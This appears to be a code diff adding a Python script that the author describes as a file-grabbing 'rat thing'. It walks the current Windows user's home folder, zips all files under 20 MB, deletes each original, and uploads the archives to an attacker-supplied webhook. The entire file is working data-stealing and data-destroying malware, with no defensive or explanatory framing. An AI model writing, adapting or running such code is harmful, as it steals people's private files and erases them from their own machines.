@@ -1,0 +1,53 @@
+import os
+import requests
+import zipfile
+import time
+
+wh = "Put your webhook here"
+
+def ca():
+    ta = os.path.join(os.environ['TEMP'], 'd.zip')
+    with zipfile.ZipFile(ta, 'w') as a:
+        pass  # Create an empty archive
+    return ta
+
+def af(archive_name, fl):
+    with zipfile.ZipFile(archive_name, 'a') as a:
+        for file_path in fl:
+            try:
+                a.write(file_path)
+                os.remove(file_path)
+            except Exception as e:
+                pass
+
+def sw(file_path):
+    files = {'file': open(file_path, 'rb')}
+    requests.post(wh, files=files)
+    requests.post(wh, data={'content': '@everyone'})  
+
+def csd():
+    caa = ca()
+    directory = 'C:/Users/' + os.getlogin()  # Get current user's directory
+    while True:
+        data_to_add = []
+        total_size = 0
+        for root, _, files in os.walk(directory):
+            for file_name in files:
+                file_path = os.path.join(root, file_name)
+                if not os.path.islink(file_path) and os.path.getsize(file_path) <= 20000000:  # 20 MB in bytes
+                    data_to_add.append(file_path)
+                    total_size += os.path.getsize(file_path)
+                    if total_size > 20000000:
+                        af(caa, data_to_add)
+                        sw(caa)
+                        os.remove(caa)
+                        caa = ca()  # Recreate initial archive
+                        total_size = 0
+                        data_to_add = []
+                        time.sleep(1)  # Delay for 1 second before continuing
+        if data_to_add:
+            af(caa, data_to_add)
+            sw(caa)
+            os.remove(caa)
+            # this wasn't made to be a full-blown kind of rat thing, I mean I can maybe come back to it and try to get it to grab other info but for now it's just kinda it grabs all the files on the PC and then sends it to the webhook then the webhook drops a .zip with all the files in there
+csd()
